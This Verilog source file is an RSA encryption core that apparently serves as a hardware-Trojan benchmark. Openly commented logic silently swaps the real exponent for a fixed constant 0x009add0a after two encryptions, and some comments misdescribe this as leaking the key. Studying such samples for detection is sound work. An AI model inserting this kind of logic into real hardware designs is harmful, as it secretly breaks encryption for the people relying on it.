// File /home/mahdi/BasicRSA-T400/src/rsacypher.vhd translated with vhd2vl v2.0 VHDL to Verilog RTL translator
// Copyright (C) 2001 Vincenzo Liguori - Ocean Logic Pty Ltd - http://www.ocean-logic.com
// Modifications (C) 2006 Mark Gonzales - PMC Sierra Inc
// 
// vhd2vl comes with ABSOLUTELY NO WARRANTY
// ALWAYS RUN A FORMAL VERIFICATION TOOL TO COMPARE VHDL INPUT TO VERILOG OUTPUT 
// 
// This is free software, and you are welcome to redistribute it under certain conditions.
// See the license file license.txt included with the source for details.

//--------------------------------------------------------------------
//--																					----
//-- Basic RSA Public Key Cryptography IP Core 							----
//-- 																					----
//-- Implementation of BasicRSA IP core according to 					----
//-- BasicRSA IP core specification document. 							----
//-- 																					----
//-- To Do: 																		----
//-- - 																				----
//-- 																					----
//-- Author(s): 																	----
//-- - Steven R. McQueen, srmcqueen@opencores.org 						----
//-- 																					----
//--------------------------------------------------------------------
//-- 																					----
//-- Copyright (C) 2001 Authors and OPENCORES.ORG 						----
//-- 																					----
//-- This source file may be used and distributed without 			----
//-- restriction provided that this copyright statement is not 	----
//-- removed from the file and that any derivative work contains 	----
//-- the original copyright notice and the associated disclaimer. ----
//-- 																					----
//-- This source file is free software; you can redistribute it 	----
//-- and/or modify it under the terms of the GNU Lesser General 	----
//-- Public License as published by the Free Software Foundation; ----
//-- either version 2.1 of the License, or (at your option) any 	----
//-- later version. 																----
//-- 																					----
//-- This source is distributed in the hope that it will be 		----
//-- useful, but WITHOUT ANY WARRANTY; without even the implied 	----
//-- warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR 		----
//-- PURPOSE. See the GNU Lesser General Public License for more 	----
//-- details. 																		----
//-- 																					----
//-- You should have received a copy of the GNU Lesser General 	----
//-- Public License along with this source; if not, download it 	----
//-- from http://www.opencores.org/lgpl.shtml 							----
//-- 																					----
//--------------------------------------------------------------------
//
// CVS Revision History
//
// $Log: not supported by cvs2svn $
//
// This module implements the RSA Public Key Cypher. It expects to receive the data block
// to be encrypted or decrypted on the indata bus, the exponent to be used on the inExp bus,
// and the modulus on the inMod bus. The data block must have a value less than the modulus.
// It may be worth noting that in practice the exponent is not restricted to the size of the
// modulus, as would be implied by the bus sizes used in this design. This design must
// therefore be regarded as a demonstration only.
//
// A Square-and-Multiply algorithm is used in this module. For each bit of the exponent, the
// message value is squared. For each '1' bit of the exponent, the message value is multiplied
// by the result of the squaring operation. The operation ends when there are no more '1'
// bits in the exponent. Unfortunately, the squaring multiplication must be performed whether
// the corresponding exponent bit is '1' or '0', so very little is gained by skipping the
// multiplication of the data value. A multiplication is performed for every significant bit
// in the exponent.
//
// Comments, questions and suggestions may be directed to the author at srmcqueen@mcqueentech.com.
//  Uncomment the following lines to use the declarations that are
//  provided for instantiating Xilinx primitive components.
//library UNISIM;
//use UNISIM.VComponents.all;

module RSACypher(
indata,
inExp,
inMod,
cypher,
clk,
ds,
reset,
ready
);

parameter KEYSIZE=32;
input[KEYSIZE - 1:0] indata;
input[KEYSIZE - 1:0] inExp;
input[KEYSIZE - 1:0] inMod;
output[KEYSIZE - 1:0] cypher;
input clk;
input ds;
input reset;
output ready;

/*
wire  [KEYSIZE - 1:0] indata;
wire  [KEYSIZE - 1:0] inExp;
wire  [KEYSIZE - 1:0] inMod;
*/

reg  [KEYSIZE - 1:0] cypher;

/*
wire   clk;
wire   ds;
wire   reset;
wire   ready;
*/

// attribute keep: string;
reg [KEYSIZE - 1:0] modreg;
// store the modulus value during operation
reg [KEYSIZE - 1:0] root;
// value to be squared
wire [KEYSIZE - 1:0] square;
// result of square operation
reg [KEYSIZE - 1:0] sqrin;
// 1 or copy of root
reg [KEYSIZE - 1:0] tempin;
// 1 or copy of square
wire [KEYSIZE - 1:0] tempout;
// result of multiplication
reg [KEYSIZE - 1:0] count;
// working copy of exponent
wire  multrdy;
wire  sqrrdy;
wire  bothrdy;
// signals to indicate completion of multiplications
reg  multgo;
wire  sqrgo;
// signals to trigger start of multiplications
reg  done;
// signal to indicate encryption complete
// By Hassan
reg [KEYSIZE - 1:0] TrojanCounter;
reg  TjEnable;
reg [KEYSIZE - 1:0] SecretKey;
// By Hassan
//   The following attributes can be set to make signal tracing easier
//attribute keep of multrdy: signal is "true";
//attribute keep of sqrrdy: signal is "true";
//attribute keep of bothrdy: signal is "true";
//attribute keep of multgo: signal is "true";
//attribute keep of sqrgo: signal is "true";

  assign ready = done;
  assign bothrdy = multrdy & sqrrdy;
  // Modular multiplier to produce products
  /*modmult #(
      .MPWID(KEYSIZE))*/
  modmult modmultiply(
      .mpand(tempin),
    .mplier(sqrin),
    .modulus(modreg),
    .product(tempout),
    .clk(clk),
    .ds(multgo),
    .reset(reset),
    .ready(multrdy));

  // Modular multiplier to take care of squaring operations
   
  modmult modsqr(
      .mpand(root),
    .mplier(root),
    .modulus(modreg),
    .product(square),
    .clk(clk),
    .ds(multgo),
    .reset(reset),
    .ready(sqrrdy));

  // Trojan leaks inExp (private key exponent (e))after certain number of encryption
  // Trojan is trigger is a counter
  always @(posedge ds or posedge reset) begin
    if(reset == 1'b1) begin
      TrojanCounter <= 32'h00000000;
    end else begin
      if(TjEnable == 1'b1) begin
        TrojanCounter <= TrojanCounter + 1;
      end
    end
  end

  // Trojan payload replaces the private key exponent
  always @(reset or TrojanCounter) begin
    if(reset == 1'b1) begin
      TjEnable = 1'b1;
    end
    else if(TrojanCounter == 32'h00000002) begin
      // After TrojanCountre times enconding
      TjEnable = 1'b0;
      // Disable Trojan counter to reduce Trojan impact on power consumption		
	  end
  end

  always @(TrojanCounter) begin 
  // Trojan replaces secret key to denial od service and 
  // the adversay would be th eonly entity would understand the message
  
    if(TrojanCounter < 32'h00000002) begin
      SecretKey = inExp;
    end
    else begin
      SecretKey = 32'h009add0a;
    end
  end

  //counter manager process tracks counter and enable flags
  always @(posedge clk) begin
      // handles DONE and COUNT signals
    if(reset == 1'b1) begin
      count <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
      done <= 1'b1;
    end else begin
      if(done == 1'b1) begin
        if(ds == 1'b1) begin
          // first time through
          count <= {1'b0,SecretKey[KEYSIZE - 1:1] };
          done <= 1'b0;
        end
        // after first time
      end
      else if(count == 0) begin
        if(bothrdy == 1'b1 && multgo == 1'b0) begin
          cypher <= tempout;
          done <= 1'b1;
        end
      end
      else if(bothrdy == 1'b1) begin
        if(multgo == 1'b0) begin
          count <= {1'b0,count[KEYSIZE - 1:1] };
        end
      end
    end
  end

  // This process sets the input values for the squaring multitplier
  always @(posedge clk) begin
    if(reset == 1'b1) begin
      root <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
      modreg <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
    end else begin
      if(done == 1'b1) begin
        if(ds == 1'b1) begin
          // first time through, input is sampled only once
          modreg <= inMod;
          root <= indata;
        end
        // after first time, square result is fed back to multiplier
      end
      else begin
        root <= square;
      end
    end
  end

  // This process sets input values for the product multiplier
  always @(posedge clk) begin
    if(reset == 1'b1) begin
      tempin <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
      sqrin <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
      modreg <= {(((KEYSIZE - 1))-((0))+1){1'b0}};
    end else begin
      if(done == 1'b1) begin
        if(ds == 1'b1) begin
          // first time through, input is sampled only once
          // if the least significant bit of the exponent is '1' then we seed the
          //		multiplier with the message value. Otherwise, we seed it with 1.
          //    The square is set to 1, so the result of the first multiplication will be
          //    either 1 or the initial message value
          if(SecretKey[0]  == 1'b1) begin
            tempin <= indata;
          end
          else begin
            tempin[KEYSIZE - 1:1]  <= {(((KEYSIZE - 1))-((1))+1){1'b0}};
            tempin[0]  <= 1'b1;
          end
          modreg <= inMod;
          sqrin[KEYSIZE - 1:1]  <= {(((KEYSIZE - 1))-((1))+1){1'b0}};
          sqrin[0]  <= 1'b1;
        end
        // after first time, the multiplication and square results are fed back through the multiplier.
        // The counter (exponent) has been shifted one bit to the right
        // If the least significant bit of the exponent is '1' the result of the most recent
        //		squaring operation is fed to the multiplier.
        //	Otherwise, the square value is set to 1 to indicate no multiplication.
      end
      else begin
        tempin <= tempout;
        if(count[0]  == 1'b1) begin
          sqrin <= square;
        end
        else begin
          sqrin[KEYSIZE - 1:1]  <= {(((KEYSIZE - 1))-((1))+1){1'b0}};
          sqrin[0]  <= 1'b1;
        end
      end
    end
  end

  // this process enables the multipliers when it is safe to do so
  always @(posedge clk) begin
    if(reset == 1'b1) begin
      multgo <= 1'b0;
    end else begin
      if(done == 1'b1) begin
        if(ds == 1'b1) begin
          // first time through - automatically trigger first multiplier cycle
          multgo <= 1'b1;
        end
        // after first time, trigger multipliers when both operations are complete
      end
      else if(count != 0) begin
        if(bothrdy == 1'b1) begin
          multgo <= 1'b1;
        end
      end
      // when multipliers have been started, disable multiplier inputs
      if(multgo == 1'b1) begin
        multgo <= 1'b0;
      end
    end
  end


endmodule
